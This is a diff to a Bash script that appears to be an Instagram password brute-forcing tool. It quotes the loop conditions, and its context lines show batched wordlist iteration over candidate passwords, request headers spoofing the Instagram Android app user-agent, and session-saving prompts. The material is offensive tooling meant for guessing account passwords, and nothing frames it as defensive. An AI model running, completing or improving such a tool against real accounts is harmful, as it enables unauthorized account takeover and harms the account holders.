@@ -133,7 +133,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 token=0
 startline=1
 endline="$threads"
-while [ $token -lt $count_pass ]; do
+while [[ "$token" -lt "$count_pass" ]]; do
 IFS=$'\n'
 for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -188,7 +188,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 
-while [ $token -lt $count_pass ]; do
+while [[ "$token" -lt "$count_pass" ]]; do
 IFS=$'\n'
 for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do
 #for pass in $(sed -n '/\b'$pass'\b/,'$threads'p' $wl_pass); do
